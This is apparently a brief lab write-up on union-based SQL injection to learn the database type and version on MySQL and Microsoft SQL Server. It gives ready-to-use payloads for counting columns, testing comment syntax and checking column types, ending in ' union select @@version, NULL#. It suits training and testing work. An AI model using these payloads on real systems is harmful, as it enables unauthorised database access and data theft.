# Database type and version on MYSQL and Microsoft

query for version checking  version

```sql
select @@version
```

end goal : database type and version

```sql
' union select @@version 
```

this query resulted in internal server error

lets try to find out the number of columns

```sql
' order by 1-- // this comment sequence is not allowed here 
```

try some other methods for comment and always take space after comments

```sql
#
---
/**/
```

lets go with hash

```sql
' order by 1#
' order by 2#
```

got two columns , here we need to encode our query in url encode

for that if you are in burp select the query and press **ctrl+u** or online url encoder

Data types check

```sql
' union select 'a','a'# 
```

both column contains text

payload

```sql
' union select @@version, NULL# 
```
